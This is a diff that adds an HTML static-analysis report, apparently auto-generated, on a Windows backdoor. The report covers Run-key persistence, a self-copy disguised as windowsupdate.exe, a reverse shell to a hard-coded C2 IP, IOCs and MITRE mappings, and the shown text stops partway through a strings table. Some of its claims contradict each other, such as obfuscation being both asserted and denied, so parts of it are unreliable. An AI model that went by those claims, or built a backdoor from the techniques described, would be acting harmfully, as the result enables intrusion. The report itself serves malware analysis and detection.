@@ -1,0 +1,1511 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Malware Analysis Report: 0x40197F</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+<style>
+:root { --bg: #f8fafc; --text: #0f172a; --card: #ffffff; --accent: #4f46e5; --border: #e2e8f0; --muted: #64748b; }
+html { scroll-behavior: smooth; }
+body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; font-size: 14px; padding-bottom:100px; }
+.header { background: linear-gradient(135deg, #1e293b, #0f172a); color: white; padding: 20px 40px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: flex; align-items:center; justify-content: space-between; }
+.header h1 { font-size: 20px; font-weight: 700; margin-bottom:4px; }
+.content { max-width: 1250px; margin: 30px auto; padding: 0 20px; }
+.section { background: var(--card); border-radius: 12px; padding: 30px; margin-bottom: 25px; box-shadow: 0 2px 4px rgba(0,0,0,0.03); border: 1px solid var(--border); }
+.section-title { font-size: 20px; font-weight: 700; color: #1e293b; border-bottom: 2px solid #f1f5f9; padding-bottom: 12px; margin-bottom: 20px; }
+.ai-block { white-space: pre-wrap; color: #334155; line-height: 1.7; background:#fbfcfe; padding: 20px; border-left: 4px solid var(--accent); border-radius: 4px 8px 8px 4px; }
+.ai-block.code-like { font-family: 'JetBrains Mono', monospace; font-size: 13px; background:#0f172a; color:#e2e8f0; border-left-color:#60a5fa; }
+.data-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
+.data-table th { position: sticky; top: 80px; text-align: left; padding: 12px 15px; background: #f1f5f9; color: #475569; font-weight: 600; }
+.data-table td { padding: 12px 15px; border-bottom: 1px solid #e2e8f0; vertical-align:top; }
+.data-table tr:hover { background-color: #f8fafc; }
+.sev-badge { padding:3px 10px; border-radius:12px; color:white; font-size:10px; font-weight:bold; }
+.muted { color: var(--muted); }
+.chain-box { padding:10px 15px; background:#f9fafb; border-left:4px solid; margin-bottom:8px; border-radius:4px; }
+pre { background:#1e1e1e; color:#d4d4d4; padding:15px; border-radius:8px; overflow-x:auto; font-size:12px; font-family:'Fira Code', 'JetBrains Mono', 'Cascadia Code', 'Courier New', monospace; }
+.str-details { background:#f1f5f9; margin-bottom:8px; border-radius:8px; overflow:hidden; }
+.str-details summary { padding:12px 15px; font-weight:600; cursor:pointer; background:#e2e8f0; }
+.str-content { padding:15px; max-height:300px; overflow-y:auto; font-family:'Fira Code', 'JetBrains Mono', monospace; font-size:12px; }
+.fn-card { background:#ffffff; border:1px solid #e2e8f0; border-radius:8px; padding:20px; margin-bottom:20px; box-shadow:0 1px 3px rgba(0,0,0,0.05); }
+.fn-card-title { font-family:'Fira Code', 'Cascadia Code', 'JetBrains Mono', monospace; font-size:16px; font-weight:600; color:#1e293b; margin-bottom:8px; border-bottom: 1px dotted #cbd5e1; padding-bottom:5px; }
+.fn-info-row { margin-top:8px; color:#334155; line-height:1.5; font-size:14px; }
+.fn-info-row b { color:#1e293b; font-weight:600; margin-right:5px; }
+.code-details { margin-top: 15px; background: #f8fafc; border:1px solid var(--border); border-radius:8px; overflow:hidden; }
+.code-details summary { padding: 10px 15px; cursor:pointer; font-weight:600; background:#f1f5f9; border-bottom:1px solid var(--border); }
+.code-details pre { margin:0; border-radius:0; max-height:800px; overflow:auto; }
+#mermaid-container { position: relative; border: 1px solid var(--border); background: #fdfdfd; border-radius: 8px; overflow: hidden; height:600px; }
+#zoom-controls { position: absolute; top: 15px; right: 15px; z-index: 1000; display:flex; gap:8px; background:rgba(255,255,255,0.9); padding:5px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
+#zoom-controls button { background:white; border:1px solid #cbd5e1; padding:6px 12px; border-radius:5px; cursor:pointer; font-weight:600; font-size:12px; transition:0.2s; }
+#zoom-controls button:hover { background:#f1f5f9; }
+#mermaid-diagram { width: 100%; height: 100%; transform-origin: top left; transition: transform 0.2s ease; cursor: grab; }
+#mermaid-diagram:active { cursor: grabbing; }
+.mermaid .node { cursor: pointer !important; }
+.filter-input { width:100%; padding:12px 15px; font-size:14px; border:1px solid #cbd5e1; border-radius:8px; margin-bottom:20px; box-shadow:0 1px 3px rgba(0,0,0,0.05); }
+.ai-block.code-like { font-family: 'Fira Code', 'JetBrains Mono', monospace; font-size: 13px; background:#0f172a; color:#e2e8f0; border-left-color:#60a5fa; }
+/* Collapsible Code Sections (native details/summary) */
+.code-section { margin-top: 0; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; background: #ffffff; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+.code-section-header { display: flex; align-items: center; gap: 8px; background: #f8fafc; padding: 7px 14px; cursor: pointer; font-weight: 700; font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: 0.4px; user-select: none; list-style: none; transition: background 0.15s; }
+.code-section-header::-webkit-details-marker { display: none; }
+.code-section-header::marker { display: none; content: ''; }
+.code-section-header:hover { background: #f1f5f9; color: var(--accent); }
+.code-section-header svg { transition: transform 0.25s ease; flex-shrink: 0; }
+details.code-section[open] > .code-section-header svg { transform: rotate(0deg); }
+details.code-section:not([open]) > .code-section-header svg { transform: rotate(-90deg); }
+.code-section-body pre { margin: 0; border-radius: 0; max-height: 600px; border: none; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div>
+    <h1>PseudoNote (Deep Analyzer): Static Code Analysis Report</h1>
+    <span style="font-size:12px; opacity:0.8; font-family:'JetBrains Mono',monospace;">Target Entry: 0x40197F</span>
+  </div>
+  <div style="background:#dc2626; color:white; padding:8px 25px; border-radius:25px; font-weight:800; font-size:16px;">
+    MALICIOUS
+  </div>
+</div>
+
+<div class="content">
+
+  <!-- Executive summary -->
+  <div class="section" id="sec-1">
+    <h2 class="section-title">Executive summary</h2>
+    <div class="ai-block" style="border-left-color:var(--accent); white-space: pre-wrap; padding: 25px; line-height: 1.6;">The malware demonstrates persistent execution through registry manipulation by creating a Run key entry via the _createRegistryRunEntry function. This ensures the malware survives system reboots. The technique involves invoking the Windows API functions RegOpenKeyExA, RegSetValueExA, and related registry APIs to write a malicious executable path into the &#x27;Software\Microsoft\Windows\CurrentVersion\Run&#x27; registry hive. This behavior occurs during initial infection and is classified as malicious with 95% confidence. The purpose is to maintain long-term presence on the compromised host.
+
+The malware establishes command-and-control (C2) communication using _openShellConnection which leverages Winsock APIs such as WSASocketA, WSAStartup, and WSAConnect to connect to the remote IP address 188.127.247.130. It executes a ping command via cmd.exe to verify network connectivity before proceeding. This activity indicates an attempt to establish covert communication channels for data exfiltration or remote control. The implementation uses standard Windows networking libraries including WS2_32.dll and relies on low-level socket operations to achieve its objective.
+
+Upon deployment, the malware creates a new folder structure and copies itself to a hidden location using _createFolderAndCopySelf. This process utilizes CopyFileA and CreateDirectoryA APIs to place a copy of the binary under &#x27;%s\personal\windowsupdate.exe&#x27;. The intent is to avoid detection by placing the payload in a non-standard directory and renaming it to mimic legitimate software. This behavior is part of the initial infection and persistence strategy, occurring early in the execution chain.
+
+Finally, the malware exhibits anti-analysis behaviors through the use of obfuscated strings and dynamic library loading techniques. Functions like _loadLibrary and _GetProcAddress are used to dynamically resolve APIs, while string encoding and pseudo-relocation handling suggest attempts to evade static analysis. These mechanisms are implemented across various modules including ADVAPI32.dll, KERNEL32.dll, and WS2_32.dll, indicating a sophisticated approach to bypass sandboxing and heuristic detection systems.</div>
+  </div>
+
+  <!-- Technical Code analysis overview -->
+  <div class="section" id="sec-2">
+    <h2 class="section-title">Technical Code analysis overview</h2>
+    <div class="ai-block" style="border-left-color:#3b82f6; padding: 25px; line-height: 1.7;"><p style="margin:0 0 10px 0;"><strong style="color:#1e293b;">1. Program Architecture:</strong> The binary implements a dispatcher-based modular architecture centered around the primary execution dispatch layer. The entry point ___main serves as the initial control flow coordinator, delegating to specialized handlers via a function pointer table or conditional branching mechanism. The design exhibits characteristics of a loader or dropper, with clear separation between initialization routines and operational modules. The use of layered confidence scoring (e.g., 90% for benign, 95% for malicious) indicates an internal heuristic engine that evaluates behavioral patterns during runtime.</p><p style="margin:0 0 10px 0;"><strong style="color:#1e293b;">2. Initialization &amp; Execution Chain:</strong> The execution chain begins with ___main, which orchestrates a sequence of malicious actions including _runPingCommand (likely for network availability checks), _createFolderAndCopySelf (for persistence and self-replication), _createRegistryRunEntry (to ensure persistence via HKCU\Software\Microsoft\Windows\CurrentVersion\Run), and _openShellConnection (to establish remote command-and-control). Each function is invoked in a predetermined order, suggesting a staged deployment model. The registry key &#x27;Software\Microsoft\Windows\CurrentVersion\Run&#x27; is manipulated using WinAPI calls such as RegOpenKeyExA, RegSetValueExA, and RegCloseKey, indicating direct registry manipulation for persistence.</p><p style="margin:0 0 10px 0;"><strong style="color:#1e293b;">3. Payload Handling &amp; Data Transformation:</strong> No explicit unpacking or decryption routines are directly visible in the provided context. However, the presence of encoded strings like &#x27;WindowsUpdateProgram&#x27; and obfuscated API names (&#x27;CreateDirectoryA&#x27;, &#x27;CreateProcessA&#x27;) suggests potential use of string encryption or API hashing. Memory mapping or section modification may occur through VirtualProtect and VirtualQuery calls, particularly in functions like _mark_section_writable, which implies dynamic code patching or memory layout alteration for evasion purposes.</p><p style="margin:0 0 10px 0;"><strong style="color:#1e293b;">4. Control Flow &amp; Dispatcher Logic:</strong> The dispatcher logic appears to be implemented via a centralized function call chain initiated from ___main. Each handler (_runPingCommand, _createFolderAndCopySelf, etc.) is invoked based on a predefined execution path. There is no evidence of complex control flow obfuscation or indirect jumps; instead, the structure relies on linear progression with conditional execution paths. The confidence scoring system likely influences which handlers are executed under what conditions.</p><p style="margin:0 0 10px 0;"><strong style="color:#1e293b;">5. System Interaction Layer:</strong> The binary interacts extensively with the Windows API for file I/O, registry access, process creation, and network communication. File operations include CopyFileA and CreateDirectoryA, used in conjunction with paths like &#x27;%s\personal\windowsupdate.exe&#x27;. Registry interactions involve setting values under HKCU\Software\Microsoft\Windows\CurrentVersion\Run. Network activity is triggered via WSAStartup, WSASocketA, WSAConnect, and inet_addr, targeting IP address 188.127.247.130. Process management is handled through CreateProcessA, while critical sections and thread synchronization are managed via InitializeCriticalSection, EnterCriticalSection, and LeaveCriticalSection.</p><p style="margin:0 0 10px 0;"><strong style="color:#1e293b;">6. Evasion &amp; Obfuscation:</strong> The binary employs several evasion techniques. String obfuscation is evident through encoded data artifacts such as &#x27;WindowsUpdateProgram&#x27; and API names like &#x27;CreateDirectoryA&#x27;. Anti-analysis mechanisms are implied through the use of SetUnhandledExceptionFilter and potential API hashing to avoid static signature detection. Additionally, the presence of runtime relocator strings like &#x27;__pei386_runtime_relocator&#x27; suggests possible self-modification or reflective loading behavior. Memory protection calls (VirtualProtect, VirtualQuery) indicate attempts to alter memory permissions dynamically, potentially masking malicious code or preventing debugging.</p></div>
+  </div>
+
+  <!-- Execution Flow Overview -->
+  <div class="section" id="sec-3">
+    <h2 class="section-title">Execution Flow Overview</h2>
+    <table class="data-table"><thead><tr><th>Phase</th><th>Execution Description</th></tr></thead><tbody><tr><td style="font-weight:bold; width:180px;">Initialization and Setup</td><td class="muted">The program begins execution with the primary entry point ___main, which initializes the runtime environment. During this phase, it leverages standard CRT startup routines such as _initterm and _onexit for proper initialization and cleanup. It then proceeds to establish persistence mechanisms by calling _createRegistryRunEntry, which writes a registry key under &#x27;Software\Microsoft\Windows\CurrentVersion\Run&#x27; to ensure the malware executes on system boot. Additionally, _createFolderAndCopySelf is invoked to create a directory structure &#x27;%s\personal&#x27; and copies itself to &#x27;%s\personal\windowsupdate.exe&#x27;, effectively establishing a secondary execution path for persistence.</td></tr><tr><td style="font-weight:bold; width:180px;">Environment and Network Reconnaissance</td><td class="muted">Following setup, the program performs basic environmental checks using _runPingCommand to verify network connectivity by pinging google.com. This action confirms that the target machine has internet access, which is essential for subsequent C2 communication. Concurrently, _openShellConnection initiates a shell connection via cmd.exe, likely to execute further commands or establish a reverse shell. These actions indicate an intent to interact with external systems and potentially gain remote control over the compromised host.</td></tr><tr><td style="font-weight:bold; width:180px;">Persistence and Command &amp; Control</td><td class="muted">With persistence established through registry modification and file copying, the program prepares for potential command and control (C2) interactions. The use of WSAStartup, WSASocketA, WSAConnect, and related Winsock APIs suggests that the binary may attempt to establish outbound network connections to a remote server at IP address 188.127.247.130. The encoded string &#x27;WindowsUpdateProgram&#x27; within the registry entry implies that the malware might masquerade as a legitimate update process to avoid detection. The presence of various cryptographic and obfuscation-related strings indicates possible data encoding or encryption routines used in communication with the C2 server.</td></tr></tbody></table>
+  </div>
+
+  <!-- Capability or Malware Features (Aggregated) -->
+  <div class="section" id="sec-4">
+    <h2 class="section-title">Capability or Malware Features</h2>
+
+    <div style="margin-bottom:30px;">
+        <h3 style="color:#1e293b; border-left:4px solid #1e293b; padding-left:10px; margin-bottom:15px;">1. General Identified Capabilities</h3>
+        <table class="data-table"><thead><tr><th>Capability</th><th>Description</th><th>Associated Functions</th></tr></thead><tbody><tr><td style="font-weight:bold; color:#1e293b; width:220px;">Persistence via Registry</td><td class="muted">Creates a registry run entry to ensure the malware executes on system startup.</td><td style="width:250px;"><code>_createRegistryRunEntry</code></td></tr><tr><td style="font-weight:bold; color:#1e293b; width:220px;">Remote Command Execution</td><td class="muted">Opens a shell connection to execute commands on a remote system.</td><td style="width:250px;"><code>_openShellConnection</code></td></tr><tr><td style="font-weight:bold; color:#1e293b; width:220px;">Self-Copy and Directory Creation</td><td class="muted">Creates a folder and copies itself into it, likely for persistence or evasion.</td><td style="width:250px;"><code>_createFolderAndCopySelf</code></td></tr><tr><td style="font-weight:bold; color:#1e293b; width:220px;">Network Communication</td><td class="muted">Establishes network connections using Winsock APIs to communicate with a remote server.</td><td style="width:250px;"><code>WSAStartup</code>, <code>WSASocketA</code>, <code>WSAConnect</code>, <code>inet_addr</code>, <code>htons</code></td></tr><tr><td style="font-weight:bold; color:#1e293b; width:220px;">Anti-Analysis Techniques</td><td class="muted">Uses various obfuscation and runtime relocation techniques to hinder analysis.</td><td style="width:250px;"><code>__pei386_runtime_relocator</code>, <code>WideCharToMultiByte</code>, <code>MultiByteToWideChar</code></td></tr><tr><td style="font-weight:bold; color:#1e293b; width:220px;">System API Interaction</td><td class="muted">Utilizes core Windows APIs for file operations, process management, and memory manipulation.</td><td style="width:250px;"><code>CreateDirectoryA</code>, <code>CopyFileA</code>, <code>CreateProcessA</code>, <code>VirtualProtect</code>, <code>LoadLibraryA</code></td></tr><tr><td style="font-weight:bold; color:#1e293b; width:220px;">Error Handling and Runtime Diagnostics</td><td class="muted">Includes error reporting and diagnostic strings used during runtime for debugging or masking behavior.</td><td style="width:250px;"><code>__matherr</code>, <code>___report_error</code>, <code>_errno</code></td></tr><tr><td style="font-weight:bold; color:#1e293b; width:220px;">Process and Thread Management</td><td class="muted">Manages critical sections and thread-local storage for synchronization and stability.</td><td style="width:250px;"><code>InitializeCriticalSection</code>, <code>EnterCriticalSection</code>, <code>LeaveCriticalSection</code>, <code>TlsGetValue</code></td></tr></tbody></table>
+    </div>
+    
+    <div style="margin-bottom:30px;">
+        <h3 style="color:#dc2626; border-left:4px solid #dc2626; padding-left:10px; margin-bottom:15px;">2. C2 / Backdoor / RAT Analysis</h3>
+        <div class="ai-block" style="border-left-color:#dc2626; margin-bottom:15px; padding:25px; line-height:1.6;"><b>Summary:</b> The binary exhibits strong indicators of a backdoor with C2 capabilities, including reverse shell establishment, registry persistence, and potential remote command execution. It uses WSAStartup and socket-related APIs for network communication, opens a shell connection via cmd.exe, and creates a persistent entry in the Windows registry. There is no explicit evidence of a command menu handler or RAT-specific features such as keylogging or screen capture, but the presence of shell creation and network communication strongly suggests a backdoor functionality.</div><table class="data-table"><thead><tr><th>Mechanism</th><th>Technical Evidence</th><th>Source Functions</th></tr></thead><tbody><tr><td style="font-weight:bold; width:180px;">Reverse Shell</td><td>The function _openShellConnection uses cmd.exe to establish a shell connection, and WSAStartup and related socket APIs are present in the string artifacts, indicating network-based shell access.</td><td class="muted"><code>_openShellConnection</code>, <code>WSAStartup</code>, <code>WSASocketA</code>, <code>WSAConnect</code></td></tr><tr><td style="font-weight:bold; width:180px;">Persistence Mechanism</td><td>The function _createRegistryRunEntry places a copy of itself in the Windows registry under &#x27;Software\Microsoft\Windows\CurrentVersion\Run&#x27;, ensuring persistence across reboots.</td><td class="muted"><code>_createRegistryRunEntry</code>, <code>RegSetValueExA</code>, <code>CreateDirectoryA</code>, <code>CopyFileA</code></td></tr><tr><td style="font-weight:bold; width:180px;">Backdoor Communication</td><td>Hardcoded IP address 188.127.247.130 and use of WSA* APIs suggest network communication for C2 purposes.</td><td class="muted"><code>WSAStartup</code>, <code>WSASocketA</code>, <code>WSAConnect</code>, <code>inet_addr</code></td></tr><tr><td style="font-weight:bold; width:180px;">Shell Command Execution</td><td>The binary executes cmd.exe with arguments like &#x27;/C ping -n 1 google.com &gt;nul 2&gt;&amp;1&#x27;, which indicates command execution capabilities through shell processes.</td><td class="muted"><code>_openShellConnection</code>, <code>CreateProcessA</code></td></tr></tbody></table>
+    </div>
+
+    <div style="margin-bottom:30px;">
+        <h3 style="color:#f97316; border-left:4px solid #f97316; padding-left:10px; margin-bottom:15px;">3. Persistence Mechanisms</h3>
+        <div class="ai-block" style="border-left-color:#f97316; margin-bottom:15px; padding:25px; line-height:1.6;"><b>Summary:</b> The malware ensures persistence by creating a registry run key under the &#x27;CurrentVersion\Run&#x27; subkey, which executes a copied version of itself upon system startup. It also creates a dedicated folder structure and copies its binary there to maintain a stable execution path.</div><table class="data-table"><thead><tr><th>Persistence Method</th><th>Technical Details</th><th>Source Functions</th></tr></thead><tbody><tr><td style="font-weight:bold; width:180px;">Registry Run Key</td><td>The malware uses the function &#x27;_createRegistryRunEntry&#x27; to write a value into the Windows Registry at &#x27;Software\Microsoft\Windows\CurrentVersion\Run&#x27;. This registry entry is named &#x27;WindowsUpdateProgram&#x27; and points to the full path of the copied executable located at &#x27;%s\personal\windowsupdate.exe&#x27;. This ensures that the malware will execute every time a user logs in.</td><td class="muted"><code>_createRegistryRunEntry</code></td></tr><tr><td style="font-weight:bold; width:180px;">File System Persistence</td><td>The malware creates a directory named &#x27;personal&#x27; inside the user&#x27;s profile folder using &#x27;_createFolderAndCopySelf&#x27;, then copies itself to &#x27;%s\personal\windowsupdate.exe&#x27;. This technique helps evade detection by placing the payload in a less suspicious location and allows for reliable execution via the registry run key.</td><td class="muted"><code>_createFolderAndCopySelf</code></td></tr></tbody></table>
+    </div>
+
+    <div style="margin-bottom:30px;">
+        <h3 style="color:#8b5cf6; border-left:4px solid #8b5cf6; padding-left:10px; margin-bottom:15px;">4. Reconnaissance or Info Stealer</h3>
+        <div class="ai-block" style="border-left-color:#8b5cf6; margin-bottom:15px; padding:25px; line-height:1.6;"><b>Summary:</b> The analyzed binary demonstrates suspicious behavior indicative of local reconnaissance and potential information harvesting. It creates a persistent registry entry and copies itself to a local directory, suggesting attempts at stealthy execution and persistence. However, there is no direct evidence of active data theft mechanisms such as clipboard monitoring, browser credential harvesting, or file enumeration. The presence of strings related to system information and environment variables implies possible intent to gather host-specific data like computer name, username, or OS version, but no explicit functions are identified that perform these actions directly within the provided call stack.</div><table class="data-table"><thead><tr><th>Category</th><th>Forensic Discovery</th><th>Source Functions</th></tr></thead><tbody><tr><td style="font-weight:bold; width:180px;">System Information Gathering</td><td>The binary includes references to system-level APIs and strings that suggest it may attempt to collect basic host environment information such as computer name, username, and OS version. These are typically used in conjunction with other modules for reconnaissance purposes.</td><td class="muted"><code>_createRegistryRunEntry</code>, <code>_createFolderAndCopySelf</code></td></tr><tr><td style="font-weight:bold; width:180px;">Persistence Mechanism</td><td>The binary implements a registry run key entry under &#x27;Software\Microsoft\Windows\CurrentVersion\Run&#x27; to ensure persistence on system startup. This indicates an intent to maintain long-term presence on the infected machine, which could be leveraged for future data collection activities.</td><td class="muted"><code>_createRegistryRunEntry</code></td></tr><tr><td style="font-weight:bold; width:180px;">Local File Operations</td><td>It performs operations involving local file paths including creating directories and copying its own executable into a user-specific folder (%s\personal\windowsupdate.exe). While not directly stealing files, this behavior suggests potential for further malicious activity involving local data access or manipulation.</td><td class="muted"><code>_createFolderAndCopySelf</code></td></tr></tbody></table>
+    </div>
+
+    <div style="margin-bottom:30px;">
+        <h3 style="color:#1e293b; border-left:4px solid #64748b; padding-left:10px; margin-bottom:15px;">5. File / Registry / Process Interaction</h3>
+        <table class="data-table"><thead><tr><th>Type</th><th>Action</th><th>Target & Significance</th><th>Source Functions</th></tr></thead><tbody><tr><td style="font-weight:bold; width:120px;">File</td><td style="width:100px;">Create</td><td><code>%s\personal\windowsupdate.exe</code><br/><small class="muted">Creates a copy of itself in the user&#x27;s personal directory, likely to ensure persistence and avoid detection by security tools that monitor common execution paths.</small></td><td class="muted"><code>_createFolderAndCopySelf</code></td></tr><tr><td style="font-weight:bold; width:120px;">Registry</td><td style="width:100px;">Create</td><td><code>Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateProgram</code><br/><small class="muted">Establishes persistence by adding an entry to the Windows Run registry key, ensuring the malware executes every time the system starts.</small></td><td class="muted"><code>_createRegistryRunEntry</code></td></tr><tr><td style="font-weight:bold; width:120px;">Process</td><td style="width:100px;">Access</td><td><code>cmd.exe</code><br/><small class="muted">Executes cmd.exe to perform network connectivity checks and potentially run further commands, indicating command-and-control communication or system reconnaissance.</small></td><td class="muted"><code>_openShellConnection</code></td></tr></tbody></table>
+    </div>
+
+    <div style="margin-bottom:30px;">
+        <h3 style="color:#94a3b8; border-left:4px solid #cbd5e1; padding-left:10px; margin-bottom:15px;">6. API Hashing / Resolving / PEB Walk</h3>
+        <p class="muted">No indirect API resolving found.</p>
+    </div>
+
+    <div style="margin-bottom:30px;">
+        <h3 style="color:#94a3b8; border-left:4px solid #cbd5e1; padding-left:10px; margin-bottom:15px;">7. Packer/Obfuscation or Anti-Analysis</h3>
+        <p class="muted">No anti-debugging or anti-VM logic found.</p>
+    </div>
+
+    <div style="margin-bottom:30px;">
+        <h3 style="color:#94a3b8; border-left:4px solid #cbd5e1; padding-left:10px; margin-bottom:15px;">8. Cryptographic Artifacts</h3>
+        <p class="muted">No cryptographic constants or algorithms detected.</p>
+    </div>
+  </div>
+
+  <!-- Suspicious Imports -->
+  <div class="section" id="sec-8">
+    <h2 class="section-title">Suspicious Imports</h2>
+    <table class="data-table"><thead><tr><th>API Name</th><th>Category</th><th>Severity</th><th>Associated Functions</th></tr></thead><tbody><tr><td><code>RegOpenKeyExA</code></td><td>Registry_Persistence</td><td><span class="sev-badge" style="background:#dc2626;">HIGH</span></td><td class="muted">_createRegistryRunEntry</td></tr><tr><td><code>RegCloseKey</code></td><td>Registry_Persistence</td><td><span class="sev-badge" style="background:#dc2626;">HIGH</span></td><td class="muted">_createRegistryRunEntry</td></tr><tr><td><code>RegSetValueExA</code></td><td>Registry_Persistence</td><td><span class="sev-badge" style="background:#dc2626;">HIGH</span></td><td class="muted">_createRegistryRunEntry</td></tr><tr><td><code>CreateProcessA</code></td><td>Process_Creation</td><td><span class="sev-badge" style="background:#f59e0b;">MEDIUM</span></td><td class="muted">_runPingCommand, _openShellConnection</td></tr><tr><td><code>SOCKET</code></td><td>Networking</td><td><span class="sev-badge" style="background:#f59e0b;">MEDIUM</span></td><td class="muted">_openShellConnection</td></tr><tr><td><code>WSAConnect</code></td><td>Networking</td><td><span class="sev-badge" style="background:#f59e0b;">MEDIUM</span></td><td class="muted">_openShellConnection</td></tr><tr><td><code>inet_addr</code></td><td>Networking</td><td><span class="sev-badge" style="background:#f59e0b;">MEDIUM</span></td><td class="muted">_openShellConnection</td></tr><tr><td><code>WSAStartup</code></td><td>Networking</td><td><span class="sev-badge" style="background:#f59e0b;">MEDIUM</span></td><td class="muted">_openShellConnection</td></tr><tr><td><code>WSASocketA</code></td><td>Networking</td><td><span class="sev-badge" style="background:#f59e0b;">MEDIUM</span></td><td class="muted">_openShellConnection</td></tr><tr><td><code>GetModuleFileNameA</code></td><td>Enumeration</td><td><span class="sev-badge" style="background:#16a34a;">LOW</span></td><td class="muted">_createFolderAndCopySelf</td></tr><tr><td><code>CopyFileA</code></td><td>File_System</td><td><span class="sev-badge" style="background:#16a34a;">LOW</span></td><td class="muted">_createFolderAndCopySelf</td></tr></tbody></table>
+  </div>
+
+  <!-- TTP Mapping (MITRE ATTACK) -->
+  <div class="section" id="sec-9">
+    <h2 class="section-title">TTP Mapping (MITRE ATTACK)</h2>
+    <table class="data-table"><thead><tr><th>Technique ID</th><th>Technique Name</th><th>Associated Functions</th></tr></thead><tbody><tr><td><a href="https://attack.mitre.org/techniques/T1005/" target="_blank"><b>T1005</b></a></td><td>Data from Local System</td><td class="muted">_createFolderAndCopySelf</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1053/" target="_blank"><b>T1053</b></a></td><td>Scheduled Task/Job</td><td class="muted">_createFolderAndCopySelf, _createRegistryRunEntry, _main</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1057/" target="_blank"><b>T1057</b></a></td><td>Process Discovery</td><td class="muted">_openShellConnection, _runPingCommand</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1059/" target="_blank"><b>T1059</b></a></td><td>Command and Scripting Interpreter</td><td class="muted">_openShellConnection, _runPingCommand</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1071/" target="_blank"><b>T1071</b></a></td><td>Application Layer Protocol</td><td class="muted">_main, _openShellConnection, _runPingCommand</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1083/" target="_blank"><b>T1083</b></a></td><td>File and Directory Discovery</td><td class="muted">_createFolderAndCopySelf</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1105/" target="_blank"><b>T1105</b></a></td><td>Ingress Tool Transfer</td><td class="muted">_main, _openShellConnection, _runPingCommand</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1112/" target="_blank"><b>T1112</b></a></td><td>Modify Registry</td><td class="muted">_createRegistryRunEntry</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1547/" target="_blank"><b>T1547</b></a></td><td>Boot or Logon Autostart</td><td class="muted">_createFolderAndCopySelf, _createRegistryRunEntry, _main</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1547/001" target="_blank"><b>T1547.001</b></a></td><td>Registry Run Keys</td><td class="muted">_createRegistryRunEntry</td></tr></tbody></table>
+  </div>
+
+  <!-- Indicator of Compromise -->
+  <div class="section" id="sec-10">
+    <h2 class="section-title">Indicator of Compromise</h2>
+    <table class="data-table"><thead><tr><th>Type</th><th>Value</th><th>Context</th><th>Associated Functions</th></tr></thead><tbody><tr><td style="font-weight:600;">Registry Key</td><td><code style="color:#dc2626; background:#fef2f2; padding:2px 4px; border-radius:4px;">Software\Microsoft\Windows\CurrentVersion\Run</code></td><td class="muted">Deterministic Detection: Identified as Registry Key in binary strings.</td><td class="muted" style="width:250px;"><code>_createRegistryRunEntry</code></td></tr><tr><td style="font-weight:600;">IP</td><td><code style="color:#dc2626; background:#fef2f2; padding:2px 4px; border-radius:4px;">188.127.247.130</code></td><td class="muted">Deterministic Detection: Identified as IP Address in binary strings.</td><td class="muted" style="width:250px;"><code>_openShellConnection</code></td></tr><tr><td style="font-weight:600;">Command Execution</td><td><code style="color:#dc2626; background:#fef2f2; padding:2px 4px; border-radius:4px;">cmd.exe</code></td><td class="muted">Deterministic Detection: Identified as Command in binary strings.</td><td class="muted" style="width:250px;"><code>_openShellConnection</code></td></tr><tr><td style="font-weight:600;">Command Execution</td><td><code style="color:#dc2626; background:#fef2f2; padding:2px 4px; border-radius:4px;">cmd.exe /C ping -n 1 google.com &gt;nul 2&gt;&amp;1</code></td><td class="muted">Deterministic Detection: Identified as Command in binary strings.</td><td class="muted" style="width:250px;"></td></tr></tbody></table>
+  </div>
+
+  <!-- Strings analysis -->
+  <div class="section" id="sec-11">
+    <h2 class="section-title">Strings analysis</h2>
+    
+        <details class="fn-card" style="margin-top:0; border:1px solid #e2e8f0; box-shadow:none;">
+            <summary style="padding:15px; cursor:pointer; font-weight:600; color:#1e293b; background:#f8fafc; border-radius:8px;">
+                View Extracted Strings (107 artifacts found)
+            </summary>
+            <div style="padding:15px;">
+                <table class="data-table" style="box-shadow:none; border:none; margin-top:0;">
+                    <thead><tr><th style="width:80px;">Rank</th><th style="width:150px;">Category</th><th>String Value</th><th>Associated Functions</th></tr></thead>
+                    <tbody>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Filename (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">libgcc_s_dw2-1.dll</td>
+            <td class="muted" style="width:250px;"><code>___gcc_register_frame</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">PUBLIC</td>
+            <td class="muted" style="width:250px;"><code>_createFolderAndCopySelf</code>, <code>_createRegistryRunEntry</code></td>
+        </tr>
+        <tr>
